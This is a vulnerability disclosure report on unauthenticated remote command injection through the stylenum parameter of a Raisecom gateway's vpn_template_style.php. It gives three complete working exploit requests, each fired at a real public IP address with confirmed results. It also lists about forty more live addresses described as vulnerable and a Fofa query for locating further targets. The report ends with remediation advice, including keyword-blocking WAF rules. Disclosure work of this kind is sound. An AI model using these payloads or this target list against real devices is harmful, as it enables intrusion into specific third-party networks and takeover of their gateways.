## Vulnerability Title
Remote Command Execution Vulnerability in Raisecom Multi-Service Intelligent Gateway vpn_template_style.php.

## Vulnerability Overview
The `/vpn/vpn_template_style.php` interface in the Raisecom Multi-Service Intelligent Gateway is vulnerable to remote command execution. An attacker can exploit this vulnerability by crafting a malicious request parameter `stylenum` and injecting system commands using backticks (`) or pipe symbols (|). This bypasses security mechanisms, allowing the execution of arbitrary commands on the target device (e.g., writing files, executing system operations). The vulnerability can be exploited without authentication and affects multiple asset instances. Verified affected addresses include [http://177.221.184.71](http://177.221.184.71) and [http://112.28.53.207:8090](http://112.28.53.207:8090).

## Vulnerability Proof
### (1) Vulnerability Reproduction
#### Reproduction 1
+ **Target IP**: [http://177.221.184.71](http://177.221.184.71)
+ **POC**:

```plain
GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+\\\'123\\\'%3E/www/tmp/test123123.txt%60 HTTP/1.1
Host: 177.221.184.71
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

**Verification Result**:

+ The request successfully triggers command execution, writing the file `/www/tmp/test123123.txt`.
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739025233630-f0ceb5c6-8eb5-4690-a3ad-381f4f5689cf.png)
+ Accessing [http://177.221.184.71/tmp/test123123.txt](http://177.221.184.71/tmp/test123123.txt) confirms the file content is "123" (see screenshot).
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028312065-f2260e49-5922-42d0-959d-3cc30566b2b5.png)

#### Reproduction 2
+ **Target IP**: [http://112.28.53.207:8090](http://112.28.53.207:8090)
+ **POC**:

```plain
GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+\'123\'%3E/www/tmp/test123123.txt%60 HTTP/1.1
Host: 112.28.53.207:8090
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

+ The command is executed, and the file is written. A 200 response indicates successful execution.
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028318030-30443209-9f11-4736-aeeb-90b57c2543af.png)
+ Accessing [http://112.28.53.207:8090/tmp/test123123.txt](http://112.28.53.207:8090/tmp/test123123.txt) confirms the file content is "123" (see screenshot).
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028326917-fadda49d-010b-47e2-8ef7-806586b8327b.png)

#### Reproduction 3
+ **Target IP**: [http://138.185.143.32](http://138.185.143.32)
+ **POC**:

```plain
GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+\'123\'%3E/www/tmp/test123123.txt%60 HTTP/1.1
Host: 138.185.143.32
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

+ Manual verification confirms the command execution.
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028333927-bda7162a-b7b6-4893-a1e2-66f80c0b0b27.png)
+ Accessing [http://138.185.143.32/tmp/test123123.txt](http://138.185.143.32/tmp/test123123.txt) confirms the file content is "123" (see screenshot).
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028339066-746c16ea-85af-4641-98c0-b7f26f1aaaca.png)

### (2) Verified Affected Addresses
Partially verified affected addresses:

+ [http://177.221.184.71](http://177.221.184.71)
+ [http://112.28.53.207:8090](http://112.28.53.207:8090)
+ [http://138.185.143.32](http://138.185.143.32)
+ [https://168.194.36.176/vpn/vpn_template_style.php](https://168.194.36.176/vpn/vpn_template_style.php)
+ [http://191.36.225.86/vpn/vpn_template_style.php](http://191.36.225.86/vpn/vpn_template_style.php)

For the complete list, refer to the end of the document.

### (3) Asset Ownership Proof
The following methods confirm asset ownership by Raisecom Technology Co., Ltd.:

+ Accessing [http://ip/down.php](http://ip/down.php) reveals device manufacturer information.
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028352712-fe47eefd-5a67-4980-be98-fdc85af9061f.png)
+ Fofa search syntax: `body="/images/raisecom/back.gif" && title=="Web user login"` locates target assets.
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028358607-af5471f6-678f-4e48-a29d-93b05301edbb.png)
+ Third-party security company (Knownsec) published vulnerability analysis reports. The report from Knownsec's security intelligence platform confirms asset ownership before releasing the vulnerability details.`https://mp.weixin.qq.com/s/iSfsiXFgaPLHtRPATslzUw`
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028366283-a9af1cdd-0695-4a37-a3ef-a4f2217b4c11.png)
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739028371561-3af7a6b3-7d4a-46e2-8a53-906773184f2c.png)

## Vulnerability Impact
1. **Complete Device Control**: Attackers can execute arbitrary system commands, taking full control of the gateway device.
2. **Data Leakage**: Command injection can read sensitive configuration files, user credentials, or network topology information.
3. **Service Disruption**: Malicious commands may cause device reboots, service crashes, or configuration tampering.
4. **Internal Network Penetration**: Compromised devices can be used as a springboard to attack other internal systems, expanding the attack scope.
5. **Compliance Risks**: The vulnerability may violate the "Cybersecurity Law" or industry security standards, leading to legal liabilities.

## Remediation Strategies
1. **Input Filtering and Parameter Whitelisting**:
    - Strictly filter the `stylenum` parameter, prohibiting special characters like backticks (`) and pipe symbols (|).
    - Only allow legitimate values that conform to business logic (e.g., predefined style numbers).
2. **Code-Level Fixes**:
    - Use secure functions (e.g., `escapeshellarg()`) to handle external inputs, avoiding direct command concatenation.
    - Remove or disable unnecessary command execution functions in `vpn_template_style.php`.
3. **Least Privilege Principle**:
    - Run the web service process with a low-privilege account, prohibiting system administrator privileges.
4. **Deploy Web Application Firewall (WAF)**:
    - Configure rules to block requests containing sensitive keywords like `echo`, `>`, and backticks.
5. **Firmware Updates and Vulnerability Monitoring**:
    - Promptly apply firmware patches released by the vendor.
    - Use vulnerability scanning tools (e.g., Nuclei, Nessus) to regularly assess device security.
6. **Emergency Response Measures**:
    - Immediately take the affected interface offline and investigate whether the device has been compromised.
    - Reset device administrator passwords and audit logs to identify potential attack traces.

**Note**: It is recommended to track vulnerability remediation progress through platforms like CNVD/CVE to ensure comprehensive risk elimination.

## Attachments
### (1) Partial IP Assets
+ [https://168.194.36.176/vpn/vpn_template_style.php](https://168.194.36.176/vpn/vpn_template_style.php)
+ [http://191.36.225.86/vpn/vpn_template_style.php](http://191.36.225.86/vpn/vpn_template_style.php)
+ [http://138.185.141.191/vpn/vpn_template_style.php](http://138.185.141.191/vpn/vpn_template_style.php)
+ [https://221.207.5.42/vpn/vpn_template_style.php](https://221.207.5.42/vpn/vpn_template_style.php)
+ [http://112.27.90.154:8088/vpn/vpn_template_style.php](http://112.27.90.154:8088/vpn/vpn_template_style.php)
+ [https://123.138.105.106:9090/vpn/vpn_template_style.php](https://123.138.105.106:9090/vpn/vpn_template_style.php)
+ [https://116.177.32.7/vpn/vpn_template_style.php](https://116.177.32.7/vpn/vpn_template_style.php)
+ [https://116.177.32.9/vpn/vpn_template_style.php](https://116.177.32.9/vpn/vpn_template_style.php)
+ [https://221.207.5.16/vpn/vpn_template_style.php](https://221.207.5.16/vpn/vpn_template_style.php)
+ [https://221.11.104.76/vpn/vpn_template_style.php](https://221.11.104.76/vpn/vpn_template_style.php)
+ [https://201.201.155.193/vpn/vpn_template_style.php](https://201.201.155.193/vpn/vpn_template_style.php)
+ [https://221.207.5.29/vpn/vpn_template_style.php](https://221.207.5.29/vpn/vpn_template_style.php)
+ [https://201.201.150.9/vpn/vpn_template_style.php](https://201.201.150.9/vpn/vpn_template_style.php)
+ [https://138.185.143.144/vpn/vpn_template_style.php](https://138.185.143.144/vpn/vpn_template_style.php)
+ [http://131.100.64.152](http://131.100.64.152)
+ [http://221.207.52.140](http://221.207.52.140)
+ [http://201.205.119.10](http://201.205.119.10)
+ [https://124.152.40.208](https://124.152.40.208)
+ [https://112.28.62.112:8091](https://112.28.62.112:8091)
+ [http://117.162.137.25:8090](http://117.162.137.25:8090)
+ [http://120.206.197.188:8090](http://120.206.197.188:8090)
+ [https://139.170.141.87](https://139.170.141.87)
+ [http://200.124.184.46](http://200.124.184.46)
+ [http://111.38.250.34:8117](http://111.38.250.34:8117)
+ [http://60.174.38.36:8889](http://60.174.38.36:8889)
+ [https://139.170.141.73](https://139.170.141.73)
+ [https://124.152.40.212](https://124.152.40.212)
+ [https://139.170.141.77](https://139.170.141.77)
+ [http://138.185.141.186:1024](http://138.185.141.186:1024)
+ [https://112.28.94.62:8091](https://112.28.94.62:8091)
+ [http://111.12.195.166:9300](http://111.12.195.166:9300)
+ [https://221.199.18.186:4443](https://221.199.18.186:4443)
+ [http://112.31.174.87:8117](http://112.31.174.87:8117)
+ [http://201.205.108.86](http://201.205.108.86)
+ [http://115.150.63.10:8090](http://115.150.63.10:8090)
+ [http://112.26.239.148:8117](http://112.26.239.148:8117)
+ [https://177.190.76.133](https://177.190.76.133)
+ [https://139.170.141.90](https://139.170.141.90)

